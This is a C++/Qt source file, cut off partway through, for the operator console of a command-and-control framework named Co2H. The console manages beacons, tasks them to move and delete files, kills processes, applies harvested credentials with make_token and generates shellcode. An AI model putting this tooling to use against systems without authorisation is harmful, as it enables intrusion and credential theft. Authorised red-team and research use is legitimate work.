#include "MainWindow.hpp"

#include "AuditView.hpp"
#include "ChatView.hpp"
#include "ConsoleWidget.hpp"
#include "CredentialsView.hpp"
#include "DownloadsView.hpp"
#include "GraphView.hpp"
#include "ListenersView.hpp"
#include "LoginDialog.hpp"
#include "SessionsView.hpp"
#include "FileBrowserView.hpp"
#include "ProcessBrowserView.hpp"
#include "SvgIcon.hpp"
#include "Theme.hpp"
#include "../models/AuditModel.hpp"
#include "../models/CredentialsModel.hpp"
#include "../models/DownloadsModel.hpp"
#include "../models/ListenersModel.hpp"
#include "../models/SessionsModel.hpp"
#include "../net/ServerClient.hpp"
#include "../plugin/PluginContext.hpp"
#include "../plugin/PluginManager.hpp"
#include "../script/ScriptEngine.hpp"
#include "ScriptsView.hpp"

#include <QRegularExpression>

#include <algorithm>
#include <cstring>

#include <co2h/kv.hpp>

#include <QAction>
#include <QApplication>
#include <QCheckBox>
#include <QCloseEvent>
#include <QComboBox>
#include <QDateTime>
#include <QTimeZone>
#include <QCoreApplication>
#include <QDir>
#include <QDirIterator>
#include <QDialog>
#include <QDialogButtonBox>
#include <QFile>
#include <QFileDialog>
#include <QFileInfo>
#include <QFormLayout>
#include <QHBoxLayout>
#include <QLabel>
#include <QLineEdit>
#include <QMenuBar>
#include <QMessageBox>
#include <QPlainTextEdit>
#include <QProcess>
#include <QSpinBox>
#include <QPushButton>
#include <QRegularExpression>
#include <QSplitter>
#include <QStandardPaths>
#include <QStatusBar>
#include <QTableWidget>
#include <QHeaderView>
#include <QTabBar>
#include <QTabWidget>
#include <QTextCharFormat>
#include <QTextCursor>
#include <QTimer>
#include <QToolBar>
#include <QVBoxLayout>
#include <QThread>
#include <QStackedWidget>
#include <QToolButton>

#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>

namespace co2h::client::ui {

MainWindow::MainWindow(ServerClient* client, const LoginInfo& info, QWidget* parent)
    : QMainWindow(parent), client_(client), login_info_(info),
      sessions_model_(new SessionsModel(this)),
      listeners_model_(new ListenersModel(this)),
      downloads_model_(new DownloadsModel(this)),
      credentials_model_(new CredentialsModel(this)),
      audit_model_(new AuditModel(this)) {
    setWindowTitle("Co2H — Operator Console");
    setWindowIcon(svgIcon(":/icons/logo.svg"));
    resize(1200, 800);

    buildUi();
    buildMenus();
    buildToolbar();
    buildStatusBar();

    connect(client_, &ServerClient::connected,
            this,    &MainWindow::onConnected);
    connect(client_, &ServerClient::disconnected,
            this,    &MainWindow::onDisconnected, Qt::QueuedConnection);
    connect(client_, &ServerClient::authOk,
            this,    &MainWindow::onAuthOk,       Qt::QueuedConnection);
    connect(client_, &ServerClient::authFailed,
            this,    &MainWindow::onAuthFailed,   Qt::QueuedConnection);
    connect(client_, &ServerClient::sessionsReceived,
            this,    &MainWindow::onSessions,     Qt::QueuedConnection);
    connect(client_, &ServerClient::listenersReceived,
            this,    &MainWindow::onListeners,    Qt::QueuedConnection);
    connect(client_, &ServerClient::taskOutput,
            this,    &MainWindow::onTaskOutput,   Qt::QueuedConnection);
    connect(client_, &ServerClient::taskCreated,
            this,    &MainWindow::onTaskCreated,  Qt::QueuedConnection);
    connect(client_, &ServerClient::credsListReceived, this,
            [this](QVector<CredentialRowSrv> rows) {
                QVector<CredentialRow> conv;
                conv.reserve(rows.size());
                for (const auto& s : rows) {
                    CredentialRow r;
                    r.id       = s.id;
                    r.user     = s.user;     r.domain = s.domain;
                    r.kind     = s.kind;     r.secret = s.secret;
                    r.host     = s.host;     r.source = s.source;
                    r.note     = s.note;     r.added_by = s.added_by;
                    r.added_at = QDateTime::fromSecsSinceEpoch(
                        static_cast<qint64>(s.added_at));
                    conv.append(r);
                }
                credentials_model_->setRows(std::move(conv));
            }, Qt::QueuedConnection);
    connect(client_, &ServerClient::credsChanged, this,
            [this]{ client_->credsList(); }, Qt::QueuedConnection);
    // Audit: сервер рассылает командные записи только админам.
    connect(client_, &ServerClient::auditReceived, this,
            [this](const QString& op, const QString& bid,
                   const QString& cmdText, quint64 ts) {
                AuditEntry ae;
                ae.timestamp  = QDateTime::fromSecsSinceEpoch(
                    static_cast<qint64>(ts), QTimeZone::systemTimeZone());
                ae.op         = op;
                ae.beacon_id  = bid;
                const auto* br = sessions_model_->findById(bid);
                ae.beacon_name = br ? (br->user + "@" + br->host) : bid;
                ae.command    = cmdText;
                audit_model_->append(ae);
            }, Qt::QueuedConnection);

    connect(client_, &ServerClient::chatReceived, this,
            [this](const QString& from, const QString& text, quint64 ts) {
                chat_view_->appendMessage(from, text, ts);
                // Если вкладка Chat не активна — пометить маркером.
                const int chatIdx = tabs_->indexOf(chat_view_);
                if (tabs_->currentIndex() != chatIdx) {
                    QString t = tabs_->tabText(chatIdx);
                    if (!t.endsWith(" •")) tabs_->setTabText(chatIdx, t + " •");
                }
            }, Qt::QueuedConnection);

    poll_ = new QTimer(this);
    poll_->setInterval(5000);
    connect(poll_, &QTimer::timeout, this, &MainWindow::refreshData);
    poll_->start();
}

void MainWindow::buildUi() {
    tabs_ = new QTabWidget(this);
    sessions_view_  = new SessionsView(sessions_model_, client_);
    listeners_view_ = new ListenersView(listeners_model_);
    connect(listeners_view_, &ListenersView::addRequested,
            this, &MainWindow::onNewListener);
    connect(listeners_view_, &ListenersView::refreshRequested,
            this, &MainWindow::refreshData);
    connect(listeners_view_, &ListenersView::removeRequested,
            this, [this](const QString& name) {
        client_->removeListener(name);
        QTimer::singleShot(500, this, &MainWindow::refreshData);
    });
    downloads_view_   = new DownloadsView(downloads_model_);
    credentials_view_ = new CredentialsView(credentials_model_);
    audit_view_       = new AuditView(audit_model_);
    chat_view_        = new ChatView();
    chat_view_->setSelfUsername(login_info_.username);
    graph_view_       = new GraphView(sessions_model_, listeners_model_, client_);
    file_browser_     = new FileBrowserView(client_, this);
    process_browser_  = new ProcessBrowserView(client_, sessions_model_, this);
    logs_ = new QPlainTextEdit(this);
    logs_->setReadOnly(true);

    tabs_->addTab(sessions_view_,    glassyIcon(":/icons/beacon.svg",      QColor("#10b981"), {18, 18}), "Sessions");
    tabs_->addTab(listeners_view_,   glassyIcon(":/icons/listener.svg",    QColor("#3b82f6"), {18, 18}), "Listeners");
    tabs_->addTab(graph_view_,       glassyIcon(":/icons/graph.svg",       QColor("#06b6d4"), {18, 18}), "Graph");
    tabs_->addTab(file_browser_,     glassyIcon(":/icons/folder.svg",      QColor("#f59e0b"), {18, 18}), "Files");
    tabs_->addTab(process_browser_, glassyIcon(":/icons/process.svg",     QColor("#ef4444"), {18, 18}), "Processes");
    tabs_->addTab(downloads_view_,   glassyIcon(":/icons/download.svg",    QColor("#f59e0b"), {18, 18}), "Downloads");
    tabs_->addTab(credentials_view_, glassyIcon(":/icons/credentials.svg", QColor("#a855f7"), {18, 18}), "Credentials");
    tabs_->addTab(chat_view_,        glassyIcon(":/icons/chat.svg",        QColor("#22d3ee"), {18, 18}), "Chat");
    tabs_->addTab(audit_view_,      glassyIcon(":/icons/lock.svg",        QColor("#f97316"), {18, 18}), "Audit");
    tabs_->addTab(logs_,             glassyIcon(":/icons/log.svg",         QColor("#94a3b8"), {18, 18}), "Logs");

    // ---- Консольные вкладки (множественные консоли) ----
    console_tabs_ = new QTabWidget(this);
    console_tabs_->setTabsClosable(true);
    console_tabs_->setMovable(false);

    // Первая консоль (не закрываемая).
    console_ = new ConsoleWidget(this);
    console_tabs_->addTab(console_, "Console #1");
    // Первую вкладку нельзя закрыть — скрываем крестик.
    if (auto* closeBtn = console_tabs_->tabBar()->tabButton(0, QTabBar::RightSide))
        closeBtn->hide();

    // Кнопка "+" для добавления новых консолей.
    auto* addConsoleBtn = new QToolButton(this);
    addConsoleBtn->setIcon(glassyIcon(":/icons/add.svg", QColor("#22c55e"), {16, 16}));
    addConsoleBtn->setToolTip("New console tab");
    addConsoleBtn->setAutoRaise(true);
    console_tabs_->setCornerWidget(addConsoleBtn, Qt::TopRightCorner);

    // Создание новой консоли.
    connect(addConsoleBtn, &QToolButton::clicked, this, [this]() {
        auto* con = new ConsoleWidget(this);
        // Новая консоль наследует текущий beacon.
        if (!console_->beaconId().isEmpty())
            con->setBeaconId(console_->beaconId());
        // Подключаем сигналы.
        connect(con, &ConsoleWidget::commandEntered,
                this, &MainWindow::onCommandEntered);
        connect(con, &ConsoleWidget::ishellInput,
                this, &MainWindow::onIShellInput);
        connect(con, &ConsoleWidget::ishellStop,
                this, &MainWindow::onIShellStop);
        // Регистрируем плагинные команды в автодополнении.
        if (plugin_ctx_) {
            for (const auto& pc : plugin_ctx_->pluginCommands())
                con->registerExternalCommand(pc.name, pc.argsHelp, pc.description);
        }
        int idx = console_tabs_->addTab(con,
            QString("Console #%1").arg(console_tabs_->count() + 1));
        console_tabs_->setCurrentIndex(idx);
    });

    // Двойной клик по заголовку вкладки — переименование.
    console_tabs_->tabBar()->setMouseTracking(true);
    connect(console_tabs_->tabBar(), &QTabBar::tabBarDoubleClicked, this, [this](int idx) {
        if (idx < 0) return;
        const QString old = console_tabs_->tabText(idx);
        auto* edit = new QLineEdit(console_tabs_->tabBar());
        edit->setText(old);
        edit->selectAll();
        edit->setFrame(false);
        edit->setStyleSheet("QLineEdit { background: palette(base); padding: 2px 4px; }");
        edit->setGeometry(console_tabs_->tabBar()->tabRect(idx));
        edit->setFocus();
        edit->show();

        auto finish = [this, edit, idx]() {
            const QString name = edit->text().trimmed();
            if (!name.isEmpty())
                console_tabs_->setTabText(idx, name);
            edit->deleteLater();
        };
        connect(edit, &QLineEdit::returnPressed, this, finish);
        connect(edit, &QLineEdit::editingFinished, this, finish);
    });

    // Закрытие вкладки консоли (кроме первой).
    connect(console_tabs_, &QTabWidget::tabCloseRequested, this, [this](int idx) {
        if (idx == 0) return; // Первую не закрываем.
        auto* w = console_tabs_->widget(idx);
        console_tabs_->removeTab(idx);
        w->deleteLater();
        // Обновить указатель на активную консоль.
        console_ = qobject_cast<ConsoleWidget*>(console_tabs_->currentWidget());
    });

    // Переключение вкладки консоли — обновить указатель console_.
    connect(console_tabs_, &QTabWidget::currentChanged, this, [this](int idx) {
        if (idx < 0) return;
        auto* w = qobject_cast<ConsoleWidget*>(console_tabs_->widget(idx));
        if (w) console_ = w;
    });

    // Панель иконок плагинов (между toolbar и вкладками).
    plugin_bar_ = new QToolBar("Plugins", this);
    plugin_bar_->setIconSize(QSize(22, 22));
    plugin_bar_->setMovable(false);
    plugin_bar_->setToolButtonStyle(Qt::ToolButtonIconOnly);
    plugin_bar_->setVisible(false); // Скрыта пока нет плагинов.

    // Стек виджетов плагинов (показывается поверх вкладок при клике на иконку).
    plugin_stack_ = new QStackedWidget(this);
    plugin_stack_->setVisible(false);

    vsplit_ = new QSplitter(Qt::Vertical, this);
    vsplit_->addWidget(tabs_);
    vsplit_->addWidget(plugin_stack_);
    vsplit_->addWidget(console_tabs_);
    vsplit_->setStretchFactor(0, 3);
    vsplit_->setStretchFactor(1, 3);
    vsplit_->setStretchFactor(2, 2);

    // Изначально стек плагинов скрыт — только вкладки.
    plugin_stack_->setVisible(false);

    auto* central = new QWidget(this);
    auto* central_layout = new QVBoxLayout(central);
    central_layout->setContentsMargins(0, 0, 0, 0);
    central_layout->setSpacing(0);
    central_layout->addWidget(plugin_bar_);
    central_layout->addWidget(vsplit_, 1);
    setCentralWidget(central);

    connect(sessions_view_, &SessionsView::interactRequested,
            this, &MainWindow::onInteract);
    connect(sessions_view_, &SessionsView::relayChildRequested,
            this, &MainWindow::onGenerateRelayChild);
    connect(graph_view_, &GraphView::interactRequested,
            this, &MainWindow::onInteract);
    connect(graph_view_, &GraphView::relayChildRequested,
            this, &MainWindow::onGenerateRelayChild);
    connect(graph_view_, &GraphView::newListenerRequested,
            this, &MainWindow::onNewListener);
    connect(graph_view_, &GraphView::stopServerRequested,
            this, &MainWindow::onStopServer);
    connect(graph_view_, &GraphView::generateArtifactRequested,
            this, [this](const QString&){ onGenerateArtifact(); });

    // Переименование бикона на графе — обновить заголовок всех консолей.
    connect(graph_view_, &GraphView::beaconRenamed,
            this, [this](const QString& bid, const QString& name) {
        for (int i = 0; i < console_tabs_->count(); ++i) {
            auto* con = qobject_cast<ConsoleWidget*>(console_tabs_->widget(i));
            if (con && con->beaconId() == bid)
                con->setBeaconAlias(name);
        }
    });

    connect(console_, &ConsoleWidget::commandEntered,
            this, &MainWindow::onCommandEntered);
    connect(console_, &ConsoleWidget::ishellInput,
            this, &MainWindow::onIShellInput);
    connect(console_, &ConsoleWidget::ishellStop,
            this, &MainWindow::onIShellStop);

    // Chat: исходящие сообщения через ServerClient::sendChat,
    // входящие приходят сигналом chatReceived (см. connect ниже).
    connect(chat_view_, &ChatView::sendRequested, this,
            [this](const QString& t){ client_->sendChat(t); });

    // Credentials: серверное хранилище. Запросы из UI → ServerClient,
    // обновления списка приходят через credsListReceived/credsChanged.
    connect(credentials_view_, &CredentialsView::requestRefresh, this,
            [this]{ client_->credsList(); });
    connect(credentials_view_, &CredentialsView::requestAdd, this,
            [this](const CredentialRow& r){
                CredentialRowSrv s;
                s.user   = r.user;   s.domain = r.domain;
                s.kind   = r.kind;   s.secret = r.secret;
                s.host   = r.host;   s.source = r.source;
                s.note   = r.note;
                client_->credsAdd(s);
            });
    connect(credentials_view_, &CredentialsView::requestDelete, this,
            [this](quint64 id){ client_->credsDel(id); });

    // File browser: ls-запрос → отправить задачу бикону, запомнить rpc_id.
    connect(file_browser_, &FileBrowserView::lsRequested, this,
            [this](const QString& bid, const QString& path) {
        quint64 rpc = client_->taskBeacon(bid, proto::TaskOp::Ls, path.toUtf8());
        file_browser_->setPendingLsRpc(rpc);
        fb_ls_by_rpc_.insert(rpc, bid);
    });
    // File browser: download.
    connect(file_browser_, &FileBrowserView::downloadRequested, this,
            [this](const QString& bid, const QString& remote, const QString& local) {
        quint64 rpc = client_->taskBeacon(bid, proto::TaskOp::Download, remote.toUtf8());
        dl_by_rpc_.insert(rpc, local);
    });
    // File browser: upload.
    connect(file_browser_, &FileBrowserView::uploadRequested, this,
            [this](const QString& bid, const QString& local, const QString& remote) {
        QFile f(local);
        if (!f.open(QIODevice::ReadOnly)) return;
        const QByteArray data = f.readAll();
        f.close();
        // Upload payload: [u32 path_len LE][path bytes][u64 offset=0 LE][data]
        const QByteArray rpath = remote.toUtf8();
        const quint32 plen = static_cast<quint32>(rpath.size());
        QByteArray pl;
        pl.reserve(4 + rpath.size() + 8 + data.size());
        pl.append(static_cast<char>( plen        & 0xFF));
        pl.append(static_cast<char>((plen >>  8) & 0xFF));
        pl.append(static_cast<char>((plen >> 16) & 0xFF));
        pl.append(static_cast<char>((plen >> 24) & 0xFF));
        pl.append(rpath);
        for (int i = 0; i < 8; ++i) pl.append('\0'); // offset = 0
        pl.append(data);
        client_->taskBeacon(bid, proto::TaskOp::Upload, pl);
    });
    // File browser: delete.
    connect(file_browser_, &FileBrowserView::deleteRequested, this,
            [this](const QString& bid, const QString& path) {
        client_->taskBeacon(bid, proto::TaskOp::Rm, path.toUtf8());
    });

    // Process browser: ps request → send task.
    connect(process_browser_, &ProcessBrowserView::psRequested, this,
            [this](const QString& bid) {
        quint64 rpc = client_->taskBeacon(bid, proto::TaskOp::Ps, {});
        process_browser_->setPendingPsRpc(rpc);
        pb_ps_by_rpc_.insert(rpc, bid);
    });
    // Process browser: kill → taskkill /F /PID <pid>.
    connect(process_browser_, &ProcessBrowserView::killRequested, this,
            [this](const QString& bid, quint32 pid) {
        QString cmd = QString("taskkill /F /PID %1").arg(pid);
        client_->taskBeacon(bid, proto::TaskOp::Shell, cmd.toUtf8());
    });

    // Credentials → make_token на активном beacon'е.
    connect(credentials_view_, &CredentialsView::applyMakeToken,
            this, [this](const QString& upn, const QString& pass) {
        const QString id = console_->beaconId();
        if (id.isEmpty()) {
            QMessageBox::information(this, "make_token",
                "Select a beacon in the Sessions tab first.");
            return;
        }
        const QByteArray pl = (upn + " " + pass).toUtf8();
        client_->taskBeacon(id, proto::TaskOp::TokenMake, pl);
        console_->appendOutput("make_token queued: " + upn);
    });

    // ---- Plugin system initialization ----
    plugin_ctx_ = new PluginContext(tabs_, plugin_bar_, plugin_stack_, vsplit_,
                                    console_, logs_,
                                    client_,
                                    sessions_model_, listeners_model_,
                                    downloads_model_, credentials_model_,
                                    this);
    // Плагины вызывают execCommand() → сигнал → диспатч через onCommandEntered.
    connect(plugin_ctx_, &PluginContext::commandRequested,
            this, &MainWindow::onCommandEntered, Qt::DirectConnection);

    plugin_mgr_ = new PluginManager(plugin_ctx_, this);

    // Load plugins from "plugins/" directory next to the executable.
    QString pluginsDir = QCoreApplication::applicationDirPath()
                         + QStringLiteral("/plugins");
    int n = plugin_mgr_->loadPlugins(pluginsDir);
    if (n > 0) {
        logs_->appendPlainText(
            QString("[plugins] loaded %1 plugin(s) from %2").arg(n).arg(pluginsDir));
        // Register plugin commands in the console hint system.
        for (const auto& pc : plugin_ctx_->pluginCommands())
            console_->registerExternalCommand(pc.name, pc.argsHelp, pc.description);
    }

    // ---- Lua scripting engine ----
    script_engine_ = new script::ScriptEngine(this);
    script_engine_->init(client_, sessions_model_);

    // Создаём вкладку Scripts и добавляем её в главный таббар.
    scripts_view_ = new ScriptsView(script_engine_, this);
    tabs_->insertTab(tabs_->indexOf(logs_),
                     scripts_view_,
                     QIcon(":/icons/scripting.svg"),
                     "Scripts");

    // Скрипт вызывает task() → пробрасываем в onCommandEntered.
    connect(script_engine_, &script::ScriptEngine::taskRequested,
            this, &MainWindow::onCommandEntered);
    // Скрипт вызывает log() → в панель Scripts и в общий лог.
    connect(script_engine_, &script::ScriptEngine::logRequested,
            this, [this](const QString& t){
                logs_->appendPlainText(t);
                scripts_view_->appendLog(t);
            });
    // Скрипт вызывает alert() → QMessageBox.
    connect(script_engine_, &script::ScriptEngine::alertRequested,
            this, [this](const QString& title, const QString& text){
                QMessageBox::information(this, title, text);
            });

    // Загрузка скриптов из scripts/ рядом с исполняемым файлом.
    QString scriptsDir = QCoreApplication::applicationDirPath()
                         + QStringLiteral("/scripts");
    script_engine_->loadDirectory(scriptsDir);
    // Регистрируем скриптовые команды в автодополнении консоли.
    for (const auto& sc : script_engine_->registeredCommands())
        console_->registerExternalCommand(sc.first, "", sc.second);
}

void MainWindow::buildMenus() {
    auto* m = menuBar()->addMenu("&File");
    auto* exitA = m->addAction(glassyIcon(":/icons/close.svg", QColor("#ef4444"), {16, 16}),
                               "E&xit");
    exitA->setShortcut(QKeySequence::Quit);
    connect(exitA, &QAction::triggered, this, &QMainWindow::close);

    auto* v = menuBar()->addMenu("&View");
    auto* themeA = v->addAction(glassyIcon(":/icons/theme.svg", QColor("#94a3b8"), {16, 16}),
                                "Toggle theme");
    connect(themeA, &QAction::triggered, this, &MainWindow::onToggleTheme);

    auto* a = menuBar()->addMenu("&Admin");
    operators_act_ = a->addAction(glassyIcon(":/icons/credentials.svg",
                                             QColor("#a855f7"), {16, 16}),
                                  "Manage operators");
    operators_act_->setEnabled(false); // включается после auth, если role=="admin"
    connect(operators_act_, &QAction::triggered, this, &MainWindow::onManageOperators);

    auto* tools = menuBar()->addMenu("&Tools");
    auto* genCertsA = tools->addAction(
        glassyIcon(":/icons/lock.svg", QColor("#10b981"), {16, 16}),
        "Generate Certificates...");
    connect(genCertsA, &QAction::triggered, this, &MainWindow::onGenerateCerts);

    auto* genShellcodeA = tools->addAction(
        glassyIcon(":/icons/plugin.svg", QColor("#a855f7"), {16, 16}),
        "Generate Shellcode (scelot)...");
    connect(genShellcodeA, &QAction::triggered, this, &MainWindow::onGenerateShellcode);

    auto* h = menuBar()->addMenu("&Help");
    auto* aboutA = h->addAction(glassyIcon(":/icons/info.svg", QColor("#3b82f6"), {16, 16}),
                                "About");
    connect(aboutA, &QAction::triggered, this, [this]{
        QMessageBox::about(this, "About Co2H",
            "<b>Co2H</b> — Operator Console<br/>"
            "Commercial C2 framework<br/>"
            "<br/>All SVG icons rendered via QtSvg.");
    });
}

void MainWindow::buildToolbar() {
    auto* tb = addToolBar("Main");
    tb->setIconSize(QSize(28, 28));
    tb->setMovable(false);
    tb->setToolButtonStyle(Qt::ToolButtonTextBesideIcon);

    // Start / Stop server buttons (leftmost, most prominent).
    start_srv_act_ = tb->addAction(glassyIcon(":/icons/play.svg",  QColor("#10b981"), {22, 22}), "Start Server");
    stop_srv_act_  = tb->addAction(glassyIcon(":/icons/stop.svg",  QColor("#ef4444"), {22, 22}), "Stop Server");
    stop_srv_act_->setEnabled(false);
    connect(start_srv_act_, &QAction::triggered, this, &MainWindow::onStartServer);
    connect(stop_srv_act_,  &QAction::triggered, this, &MainWindow::onStopServer);

    tb->addAction(glassyIcon(":/icons/connection.svg", QColor("#3b82f6"), {22, 22}), "Connect",
                  this, &MainWindow::reconnect);
    tb->addSeparator();
    tb->addAction(glassyIcon(":/icons/refresh.svg", QColor("#60a5fa"), {22, 22}), "Refresh",
                  this, &MainWindow::refreshData);
    tb->addSeparator();
    tb->addAction(glassyIcon(":/icons/add.svg",     QColor("#22c55e"), {22, 22}), "New listener",
                  this, &MainWindow::onNewListener);
    tb->addAction(glassyIcon(":/icons/plugin.svg",  QColor("#a855f7"), {22, 22}), "Generate artifact",
                  this, &MainWindow::onGenerateArtifact);
    tb->addSeparator();
    tb->addAction(glassyIcon(":/icons/theme.svg",   QColor("#94a3b8"), {22, 22}), "Toggle theme",
                  this, &MainWindow::onToggleTheme);
}

void MainWindow::buildStatusBar() {
    statusBar()->showMessage("Disconnected");
}

void MainWindow::updateIcons() {
    setWindowIcon(svgIcon(":/icons/logo.svg"));
    if (!tabs_) return;
    tabs_->setTabIcon(0, glassyIcon(":/icons/beacon.svg",      QColor("#10b981"), {18, 18}));
    tabs_->setTabIcon(1, glassyIcon(":/icons/listener.svg",    QColor("#3b82f6"), {18, 18}));
    tabs_->setTabIcon(2, glassyIcon(":/icons/graph.svg",       QColor("#06b6d4"), {18, 18}));
    tabs_->setTabIcon(3, glassyIcon(":/icons/download.svg",    QColor("#f59e0b"), {18, 18}));
    tabs_->setTabIcon(4, glassyIcon(":/icons/credentials.svg", QColor("#a855f7"), {18, 18}));
    tabs_->setTabIcon(5, glassyIcon(":/icons/chat.svg",        QColor("#22d3ee"), {18, 18}));
    tabs_->setTabIcon(6, glassyIcon(":/icons/log.svg",         QColor("#94a3b8"), {18, 18}));
}

void MainWindow::onConnected() {
    statusBar()->showMessage("Connected. Authenticating…");
}

void MainWindow::onDisconnected(const QString& reason) {
    statusBar()->showMessage("Disconnected: " + reason);
    logs_->appendPlainText("[" + QDateTime::currentDateTime().toString(Qt::ISODate)
                           + "] disconnected: " + reason);
}

void MainWindow::onAuthOk(quint64 opId, const QString& role) {
    current_role_ = role;
    if (operators_act_) operators_act_->setEnabled(role == "admin");
    statusBar()->showMessage(QString("Authenticated as id=%1 role=%2")
                                 .arg(opId).arg(role));
    refreshData();
    client_->credsList();
}

void MainWindow::onAuthFailed(const QString& reason) {
    QMessageBox::critical(this, "Authentication failed", reason);
    close();
}

void MainWindow::onSessions(QVector<BeaconRow> rows) {
    // Удаляем сессии, от которых нет сигнала дольше 3 минут (180 секунд).
    // last_seen == 0 означает, что сервер не передал время — такие не трогаем.
    const qint64 now     = QDateTime::currentSecsSinceEpoch();
    const qint64 timeout = 180;
    auto it = std::remove_if(rows.begin(), rows.end(), [now, timeout](const BeaconRow& r) {
        return r.last_seen > 0 && (now - r.last_seen) > timeout;
    });
    rows.erase(it, rows.end());

    // Lua scripting: определить новые биконы ДО обновления модели,
    // чтобы потом вызвать fireBeaconNew когда модель уже содержит их данные.
    QStringList new_beacon_ids;
    if (script_engine_) {
        const auto& old = sessions_model_->rows();
        for (const auto& r : rows) {
            bool found = false;
            for (const auto& o : old)
                if (o.id == r.id) { found = true; break; }
            if (!found)
                new_beacon_ids.append(r.id);
        }
    }

    sessions_model_->setRows(std::move(rows));
    process_browser_->refreshBeaconList();

    // Теперь модель обновлена — findById вернёт полные данные бикона.
    for (const auto& id : new_beacon_ids)
        script_engine_->fireBeaconNew(id);
}

void MainWindow::onListeners(QVector<ListenerRow> rows) {
    listeners_model_->setRows(std::move(rows));
}

void MainWindow::onTaskOutput(const QString& beaconId, quint64 taskId,
                              const QByteArray& output, const QString& error) {
    // Если это ps из обозревателя процесс��в — отдать ему, не печатать в кон��оль.
    auto pbPsIt = pb_ps_by_task_.find(taskId);
    if (pbPsIt != pb_ps_by_task_.end()) {
        const QString pbBeacon = pbPsIt.value();
        pb_ps_by_task_.erase(pbPsIt);
        if (pbBeacon == process_browser_->beaconId()) {
            if (!error.isEmpty())
                process_browser_->setPsError(error);
            else
                process_browser_->onPsOutput(output);
        }
        return;
    }

    // Если это ls из файлового браузера — отдать ему, не печатать в консоль.
    auto fbLsIt = fb_ls_by_task_.find(taskId);
    if (fbLsIt != fb_ls_by_task_.end()) {
        const QString fbBeacon = fbLsIt.value();
        fb_ls_by_task_.erase(fbLsIt);
        if (fbBeacon == file_browser_->beaconId()) {
            if (!error.isEmpty())
                file_browser_->setLsError(error);
            else
                file_browser_->onLsOutput(output);
        }
        return;
    }

    // Если это завершение download — сохранить байты в файл, не печатать в консоль.
    auto dlIt = dl_by_task_.find(taskId);
    if (dlIt != dl_by_task_.end()) {
        const QString localPath = dlIt.value();
        dl_by_task_.erase(dlIt);
        if (!error.isEmpty()) {
            downloads_model_->markCompleted(taskId, -1, error);
            console_->appendErrorForBeacon(beaconId,
                QString("download task %1: %2").arg(taskId).arg(error));
            return;
        }
        QFile f(localPath);
        if (!f.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
            downloads_model_->markCompleted(taskId, -1,
                "can't write " + localPath);
            console_->appendErrorForBeacon(beaconId,
                QString("download: can't write %1").arg(localPath));
            return;
        }
        f.write(output);
        f.close();
        downloads_model_->markCompleted(taskId, output.size(), {});
        console_->appendOutputForBeacon(beaconId,
            QString("downloaded %1 bytes -> %2").arg(output.size()).arg(localPath));
        return;
    }

    // Plugin routing: if a plugin registered a callback for this task.
    if (plugin_ctx_ && plugin_ctx_->routeTaskOutput(taskId, output, error))
        return;

    // Lua scripting: оповестить о выводе задачи.
    if (script_engine_ && !output.isEmpty())
        script_engine_->fireTaskOutput(beaconId, taskId,
                                       QString::fromUtf8(output));

    // Авто-парсинг идентичностей: отправляем серверу creds.add — он
    // сам сделает дедупликацию и пришлёт всем broadcast Credentials.
    if (!output.isEmpty()) {
        static const QRegularExpression reIdent(
            R"(^([A-Za-z0-9_.\-]+)\\([A-Za-z0-9_.\-$]+)\s*\(S-1-[0-9\-]+\))",
            QRegularExpression::MultilineOption);
        // На Windows бикон конвертирует OEM→UTF-8, на Linux вывод уже UTF-8.
#ifdef _WIN32
        const QString outStr = QString::fromUtf8(output);
#else
        const QString outStr = QString::fromLocal8Bit(output);
#endif
        auto it = reIdent.globalMatch(outStr);
        while (it.hasNext()) {
            auto m = it.next();
            CredentialRowSrv s;
            s.user   = m.captured(2);
            s.domain = m.captured(1);
            s.kind   = "identity";
            s.source = beaconId;
            client_->credsAdd(s);
        }
    }

    // Доставка вывода в консоль.
    auto deliver = [&](ConsoleWidget* con) {
        if (!error.isEmpty())
            con->appendErrorForBeacon(beaconId,
                QString("task %1 error: %2").arg(taskId).arg(error));
        if (!output.isEmpty()) {
            const QString text = QString::fromUtf8(output);
            con->appendOutputForBeacon(beaconId, text);
        }
    };

    // 1) Привязка по task_id — конкретная консоль отправила эту команду.
    auto conIt = con_by_task_.find(taskId);
    if (conIt != con_by_task_.end()) {
        deliver(conIt.value());
        con_by_task_.erase(conIt);
    } else {
        // 2) Нет привязки (ishell, потоковый вывод) — рассылаем во ВСЕ
        //    вкладки консолей с нужным beaconId. Каждая вкладка независимо
        //    накапливает вывод, даже если она не активна.
        bool delivered = false;
        for (int i = 0; i < console_tabs_->count(); ++i) {
            auto* con = qobject_cast<ConsoleWidget*>(console_tabs_->widget(i));
            if (con && con->beaconId() == beaconId) {
                deliver(con);
                delivered = true;
            }
        }
        // 3) Ни одна вкладка не показывает этот бикон — буферизуем на
        //    активной консоли. При переключении на бикон вывод отобразится.
        if (!delivered)
            deliver(console_);
    }
}

void MainWindow::onTaskCreated(quint64 rpcId, quint64 taskId) {
    // Download routing.
    auto it = dl_by_rpc_.find(rpcId);
    if (it != dl_by_rpc_.end()) {
        dl_by_task_.insert(taskId, it.value());
        dl_by_rpc_.erase(it);
        downloads_model_->bindTaskId(rpcId, taskId);
    }
    // File browser ls routing: rpc_id → task_id.
    auto fbIt = fb_ls_by_rpc_.find(rpcId);
    if (fbIt != fb_ls_by_rpc_.end()) {
        fb_ls_by_task_.insert(taskId, fbIt.value());
        fb_ls_by_rpc_.erase(fbIt);
    }
    // Process browser ps routing: rpc_id → task_id.
    auto pbIt = pb_ps_by_rpc_.find(rpcId);
    if (pbIt != pb_ps_by_rpc_.end()) {
        pb_ps_by_task_.insert(taskId, pbIt.value());
        pb_ps_by_rpc_.erase(pbIt);
    }
    // Console routing: rpc_id → task_id → ConsoleWidget*.
    auto conIt = con_by_rpc_.find(rpcId);
    if (conIt != con_by_rpc_.end()) {
        con_by_task_.insert(taskId, conIt.value());
        con_by_rpc_.erase(conIt);
    }
    // Plugin task routing: rpc_id → task_id.
    if (plugin_ctx_)
        plugin_ctx_->bindTaskId(rpcId, taskId);
}

void MainWindow::onCommandEntered(const QString& beaconId, const QString& cmd) {
    // Запоминаем счётчик rpc ДО выполнения, чтобы привязать вывод к консоли.
    const quint64 rpcBefore = client_->currentRpcCounter();

    // ---- Audit log ----
    // Админ получает аудит всех операторов через серверный broadcast.
    // Не-админу — локальная запись только своих команд.
    if (current_role_ != "admin") {
        AuditEntry ae;
        ae.timestamp  = QDateTime::currentDateTime();
        ae.op         = login_info_.username;
        ae.beacon_id  = beaconId;
